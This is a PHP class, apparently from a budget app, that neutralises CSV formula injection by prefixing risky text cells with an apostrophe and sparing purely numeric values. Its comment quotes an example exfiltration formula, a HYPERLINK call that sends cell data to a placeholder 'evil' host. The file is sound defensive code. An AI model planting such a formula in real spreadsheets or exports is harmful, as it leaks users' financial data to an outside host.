<?php

declare(strict_types=1);

namespace OCA\Budget\Service\Export;

/**
 * CSV output that a spreadsheet will not execute.
 *
 * Excel, LibreOffice and Sheets treat a cell starting with =, +, -, @, a tab
 * or a carriage return as a formula. Descriptions, vendors, notes, category
 * and account names all come from users or bank statements, so a transaction
 * described as `=HYPERLINK("http://evil/?"&A1, "Click")` would run when the
 * export is opened (CSV/formula injection). Such text cells get a leading
 * apostrophe, which the spreadsheet shows as plain text.
 *
 * Numbers are left alone: an amount of -12.50 (or a change of -3.5%) must stay
 * a number the user can sum, so a cell that is purely numeric is never
 * prefixed.
 *
 * Every CSV this app writes goes through put().
 */
final class CsvSafe {
    private const FORMULA_TRIGGERS = ['=', '+', '-', '@', "\t", "\r"];

    /** A plain number: optional sign, digits with , or . separators, optional exponent or %. */
    private const NUMERIC = '/^[+-]?\d+(?:[.,]\d+)*(?:[eE][+-]?\d+)?%?$/';

    private function __construct() {
    }

    /**
     * Neutralise one cell. Non-strings (ints, floats, null, bools) pass
     * through untouched.
     */
    public static function cell(mixed $value): mixed {
        // A lone '-' is the "no value" placeholder in several exports and
        // cannot form a formula on its own
        if (!is_string($value) || $value === '' || $value === '-') {
            return $value;
        }
        if (!in_array($value[0], self::FORMULA_TRIGGERS, true)) {
            return $value;
        }
        if (preg_match(self::NUMERIC, $value) === 1) {
            return $value;
        }
        return "'" . $value;
    }

    /**
     * @param array<int|string, mixed> $row
     * @return array<int|string, mixed>
     */
    public static function row(array $row): array {
        return array_map([self::class, 'cell'], $row);
    }

    /**
     * fputcsv() with every cell neutralised.
     *
     * @param resource $handle
     * @param array<int|string, mixed> $row
     */
    public static function put($handle, array $row): void {
        fputcsv($handle, self::row($row));
    }
}
